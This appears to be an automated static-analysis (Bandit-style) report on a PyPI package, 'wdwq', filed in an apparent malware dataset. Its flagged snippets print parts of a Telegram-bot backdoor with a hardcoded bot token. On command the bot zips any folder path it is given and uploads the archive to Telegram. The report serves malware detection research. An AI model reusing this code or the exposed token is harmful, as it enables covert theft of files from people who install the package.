Run started:2025-05-25 16:26:43.859441

Test results:
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/setup.py:13
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
12	    long_description_content_type='text/markdown',  
13	    url='https://t.me/pozozal', 
14	    author='pozozal',

--------------------------------------------------
>> Issue: [B824:url_found] url_found
   Severity: Medium   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:7
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b824_url_found.html
6	    API_TOKEN = '7823633815:AAHnvkpndgRLsSrU4mzwJ3pEXC6AE2Bl0-k'
7	    API_URL = f'https://api.telegram.org/bot{API_TOKEN}/'
8	

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:19
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
18	
19	        response = requests.get(url)
20	        for update in response.json().get('result', []):

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:20
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
19	        response = requests.get(url)
20	        for update in response.json().get('result', []):
21	            update_id = update['update_id']

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:29
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
28	                    user_states[chat_id] = 'zip' 
29	                    requests.post(API_URL + 'sendMessage', json={'chat_id': chat_id, 'text': "Введите путь к папке для архивирования:"})
30	                offset = update_id + 1

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:34
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
33	            if user_id not in ALLOWED_USERS: 
34	                requests.post(API_URL + 'sendMessage', json={'chat_id': chat_id, 'text': "У вас нет доступа к этому боту."})
35	                continue

--------------------------------------------------
>> Issue: [B820:get] requests.get
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:37
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b820_get.html
36	
37	            message_text = update['message'].get('text', '')
38	

--------------------------------------------------
>> Issue: [B815:write] os.write
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:45
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b815_write.html
44	                            for file in files:
45	                                zip_file.write(os.path.join(root, file), 
46	                                               os.path.relpath(os.path.join(root, file), 
47	                                               os.path.join(message_text, '..')))
48	                    requests.post(API_URL + 'sendDocument', data={'chat_id': chat_id}, files={'document': open(zip_path, 'rb')})

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:48
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
47	                                               os.path.join(message_text, '..')))
48	                    requests.post(API_URL + 'sendDocument', data={'chat_id': chat_id}, files={'document': open(zip_path, 'rb')})
49	                    os.remove(zip_path)

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:51
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
50	                except Exception as e:
51	                    requests.post(API_URL + 'sendMessage', json={'chat_id': chat_id, 'text': f"Ошибка: {e}"})
52	                del user_states[chat_id]

--------------------------------------------------
>> Issue: [B821:post] requests.post
   Severity: High   Confidence: Medium
   Location: /home2/blue/Documents/PyPIAgent/Dataset/latest/unzip_malware/wdwq-1.4.3/wdwq-1.4.3/wdwq-1.4.3/wdwq/wdwq.py:55
   More Info: https://bandit.readthedocs.io/en/latest/plugins/b821_post.html
54	                keyboard = {'inline_keyboard': [[{'text': 'ZIP', 'callback_data': 'zip'}]]}
55	                requests.post(API_URL + 'sendMessage', json={'chat_id': chat_id, 'text': "Выберите действие:", 'reply_markup': keyboard})
56	                

--------------------------------------------------

Code scanned:
	Total lines of code: 72
	Total lines skipped (#nosec): 0

Run metrics:
	Total issues (by severity):
		Undefined: 0.0
		Low: 0.0
		Medium: 2.0
		High: 9.0
	Total issues (by confidence):
		Undefined: 0.0
		Low: 0.0
		Medium: 11.0
		High: 0.0
Files skipped (0):
